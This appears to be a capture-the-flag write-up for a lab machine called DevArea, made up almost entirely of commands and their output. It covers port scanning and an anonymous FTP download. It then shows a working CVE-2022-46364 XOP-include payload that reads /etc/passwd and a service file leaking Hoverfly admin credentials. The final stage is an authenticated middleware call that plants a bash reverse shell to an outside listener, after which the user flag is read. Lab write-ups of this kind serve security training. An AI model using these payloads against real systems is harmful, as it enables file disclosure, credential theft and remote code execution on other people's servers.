network enumeration:

```
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.5
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    2 ftp      ftp          4096 Sep 22  2025 pub
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:10.10.15.69
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.5 - secure, fast, stable
|_End of status
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.15 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 83:13:6b:a1:9b:28:fd:bd:5d:2b:ee:03:be:9c:8d:82 (ECDSA)
|_  256 0a:86:fa:65:d1:20:b4:3a:57:13:d1:1a:c2:de:52:78 (ED25519)
80/tcp   open  http    Apache httpd 2.4.58
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-title: DevArea - Connect with Top Development Talent
8080/tcp open  http    Jetty 9.4.27.v20200227
|_http-title: Error 404 Not Found
|_http-server-header: Jetty(9.4.27.v20200227)
8500/tcp open  fmtp?
| fingerprint-strings:
|   FourOhFourRequest:
|     HTTP/1.0 500 Internal Server Error
|     Content-Type: text/plain; charset=utf-8
|     X-Content-Type-Options: nosniff
|     Date: Tue, 31 Mar 2026 06:14:50 GMT
|     Content-Length: 64
|     This is a proxy server. Does not respond to non-proxy requests.
|   GenericLines, Help, Kerberos, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie:
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest, HTTPOptions:
|     HTTP/1.0 500 Internal Server Error
|     Content-Type: text/plain; charset=utf-8
|     X-Content-Type-Options: nosniff
|     Date: Tue, 31 Mar 2026 06:14:21 GMT
|     Content-Length: 64
|_    This is a proxy server. Does not respond to non-proxy requests.
8888/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Hoverfly Dashboard
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8500-TCP:V=7.94SVN%I=7%D=3/31%Time=69CB663C%P=x86_64-pc-linux-gnu%r
SF:(GenericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x
SF:20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Ba
SF:d\x20Request")%r(GetRequest,E9,"HTTP/1\.0\x20500\x20Internal\x20Server\
SF:x20Error\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nX-Content-
SF:Type-Options:\x20nosniff\r\nDate:\x20Tue,\x2031\x20Mar\x202026\x2006:14
SF::21\x20GMT\r\nContent-Length:\x2064\r\n\r\nThis\x20is\x20a\x20proxy\x20
SF:server\.\x20Does\x20not\x20respond\x20to\x20non-proxy\x20requests\.\n")
SF:%r(HTTPOptions,E9,"HTTP/1\.0\x20500\x20Internal\x20Server\x20Error\r\nC
SF:ontent-Type:\x20text/plain;\x20charset=utf-8\r\nX-Content-Type-Options:
SF:\x20nosniff\r\nDate:\x20Tue,\x2031\x20Mar\x202026\x2006:14:21\x20GMT\r\
SF:nContent-Length:\x2064\r\n\r\nThis\x20is\x20a\x20proxy\x20server\.\x20D
SF:oes\x20not\x20respond\x20to\x20non-proxy\x20requests\.\n")%r(RTSPReques
SF:t,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain
SF:;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request
SF:")%r(Help,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20te
SF:xt/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x2
SF:0Request")%r(SSLSessionReq,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nCo
SF:ntent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n
SF:\r\n400\x20Bad\x20Request")%r(TerminalServerCookie,67,"HTTP/1\.1\x20400
SF:\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\n
SF:Connection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(TLSSessionReq,67,
SF:"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20
SF:charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(
SF:Kerberos,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20tex
SF:t/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20
SF:Request")%r(FourOhFourRequest,E9,"HTTP/1\.0\x20500\x20Internal\x20Serve
SF:r\x20Error\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nX-Conten
SF:t-Type-Options:\x20nosniff\r\nDate:\x20Tue,\x2031\x20Mar\x202026\x2006:
SF:14:50\x20GMT\r\nContent-Length:\x2064\r\n\r\nThis\x20is\x20a\x20proxy\x
SF:20server\.\x20Does\x20not\x20respond\x20to\x20non-proxy\x20requests\.\n
SF:");
Service Info: Host: _; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

```
# login in ftp by anonymous

ajdev@rootbox:~$ ftp anonymous@10.129.21.35
Connected to 10.129.21.35.
220 (vsFTPd 3.0.5)
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||44433|)
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Sep 22  2025 pub
226 Directory send OK.
ftp> cd pub
250 Directory successfully changed.
ftp> ls -la
229 Entering Extended Passive Mode (|||43577|)
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Sep 22  2025 .
drwxr-xr-x    3 ftp      ftp          4096 Sep 22  2025 ..
-rw-r--r--    1 ftp      ftp       6445030 Sep 22  2025 employee-service.jar
226 Directory send OK.
ftp> get employee-service.jar
local: employee-service.jar remote: employee-service.jar
229 Entering Extended Passive Mode (|||46717|)
150 Opening BINARY mode data connection for employee-service.jar (6445030 bytes).
100% |************************************************************************************************************************************************************************************|  6293 KiB  398.89 KiB/s    00:00 ETA
226 Transfer complete.
6445030 bytes received in 00:15 (394.04 KiB/s)
```

Found LFI via CVE-2022-46364:

```
ajdev@rootbox:~/HTB/DevArea$ curl -s http://devarea.htb:8080/employeeservice \
  -H 'Content-Type: multipart/related; type="application/xop+xml"; boundary="MIMEBoundary"; start="<root.message@cxf.apache.org>"; start-info="text/xml"' \
  --data-binary $'--MIMEBoundary\r\nContent-Type: application/xop+xml; charset=UTF-8; type="text/xml"\r\nContent-Transfer-Encoding: 8bit\r\nContent-ID: <root.message@cxf.apache.org>\r\n\r\n<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">\r\n  <soap:Body>\r\n    <ns2:submitReport xmlns:ns2="http://devarea.htb/">\r\n      <arg0>\r\n        <confidential>true</confidential>\r\n        <content><inc:Include href="file:///etc/passwd" xmlns:inc="http://www.w3.org/2004/08/xop/include"/></content>\r\n        <department>test</department>\r\n        <employeeName>test</employeeName>\r\n      </arg0>\r\n    </ns2:submitReport>\r\n  </soap:Body>\r\n</soap:Envelope>\r\n--MIMEBoundary--' \
  | grep -oP '(?<=Content: ).*(?=</return>)' | base64 -d
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
messagebus:x:101:102::/nonexistent:/usr/sbin/nologin
systemd-resolve:x:992:992:systemd Resolver:/:/usr/sbin/nologin
pollinate:x:102:1::/var/cache/pollinate:/bin/false
polkitd:x:991:991:User for polkitd:/:/usr/sbin/nologin
syslog:x:103:104::/nonexistent:/usr/sbin/nologin
uuidd:x:104:105::/run/uuidd:/usr/sbin/nologin
tcpdump:x:105:107::/nonexistent:/usr/sbin/nologin
tss:x:106:108:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:107:109::/var/lib/landscape:/usr/sbin/nologin
fwupd-refresh:x:989:989:Firmware update daemon:/var/lib/fwupd:/usr/sbin/nologin
usbmux:x:108:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
dev_ryan:x:1001:1001::/home/dev_ryan:/bin/bash
ftp:x:110:111:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
syswatch:x:984:984::/opt/syswatch:/usr/sbin/nologin
postfix:x:111:112::/var/spool/postfix:/usr/sbin/nologin
_laurel:x:999:987::/var/log/laurel:/bin/false
dhcpcd:x:100:65534:DHCP Client Daemon,,,:/usr/lib/dhcpcd:/bin/false
```

```
ajdev@rootbox:~/HTB/DevArea$ curl -s http://devarea.htb:8080/employeeservice \
-H 'Content-Type: multipart/related; type="application/xop+xml"; boundary="MIMEBoundary"; start="<root.message@cxf.apache.org>"; start-info="text/xml"' \
--data-binary $'--MIMEBoundary\r\nContent-Type: application/xop+xml; charset=UTF-8; type="text/xml"\r\nContent-Transfer-Encoding: 8bit\r\nContent-ID: <root.message@cxf.apache.org>\r\n\r\n<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">\r\n  <soap:Body>\r\n    <ns2:submitReport xmlns:ns2="http://devarea.htb/">\r\n      <arg0>\r\n        <confidential>true</confidential>\r\n        <content><inc:Include href="file:///etc/systemd/system/hoverfly.service" xmlns:inc="http://www.w3.org/2004/08/xop/include"/></content>\r\n        <department>test</department>\r\n        <employeeName>test</employeeName>\r\n      </arg0>\r\n    </ns2:submitReport>\r\n  </soap:Body>\r\n</soap:Envelope>\r\n--MIMEBoundary--' \
| grep -oP '(?<=Content: ).*(?=</return>)' | base64 -d
[Unit]
Description=HoverFly service
After=network.target

[Service]
User=dev_ryan
Group=dev_ryan
WorkingDirectory=/opt/HoverFly
ExecStart=/opt/HoverFly/hoverfly -add -username admin -password O7IJ27MyyXiU -listen-on-host 0.0.0.0

Restart=on-failure
RestartSec=5
StartLimitIntervalSec=60
StartLimitBurst=5
LimitNOFILE=65536
StandardOutput=journal
StandardError=journal

[Install]
WantedBy=multi-user.target
```

```
ajdev@rootbox:~/HTB/DevArea$ curl -s -X POST http://devarea.htb:8888/api/token-auth \
-H "Content-Type: application/json" \
-d '{"username":"admin","password":"O7IJ27MyyXiU"}'
{"token":"eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJleHAiOjIwODU5Nzg4MjMsImlhdCI6MTc3NDkzODgyMywic3ViIjoiIiwidXNlcm5hbWUiOiJhZG1pbiJ9.mMwrb0M7U2vM0yfGizMPyLvOPw3SdV4--uDcKfXI4u9h77ZColt_1iV2LdEPEi5LefMOUkn6Jo-UpatQeyCsQQ"}
```

now get reverse shell:

```
ajdev@rootbox:~/HTB/DevArea$ curl -s -X PUT http://devarea.htb:8888/api/v2/hoverfly/middleware \
-H "Authorization: Bearer eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJleHAiOjIwODU5Nzg4MjMsImlhdCI6MTc3NDkzODgyMywic3ViIjoiIiwidXNlcm5hbWUiOiJhZG1pbiJ9.mMwrb0M7U2vM0yfGizMPyLvOPw3SdV4--uDcKfXI4u9h77ZColt_1iV2LdEPEi5LefMOUkn6Jo-UpatQeyCsQQ" \
-H "Content-Type: application/json" \
-d '{"binary":"bash","script":"bash -i >& /dev/tcp/10.10.15.69/4444 0>&1"}'

listen in port 4444:

ajdev@rootbox:~$ nc -lvnp 4444
Listening on 0.0.0.0 4444
Connection received on 10.129.21.35 39838
bash: cannot set terminal process group (1456): Inappropriate ioctl for device
bash: no job control in this shell
dev_ryan@devarea:/opt/HoverFly$ cd /home
cd /home
dev_ryan@devarea:/home$ ls -la
ls -la
total 12
drwxr-xr-x  3 root     root     4096 Dec  4 14:05 .
drwxr-xr-x 24 root     root     4096 Mar 22 18:55 ..
drwxr-x---  5 dev_ryan dev_ryan 4096 Mar 10 16:28 dev_ryan
dev_ryan@devarea:/home$ cd dev_ryan
cd dev_ryan
dev_ryan@devarea:~$ ls
ls
syswatch-v1.zip
user.txt
dev_ryan@devarea:~$ cat user.txt
cat user.txt
b26907b13d0b9feb29192f3178938a05
```


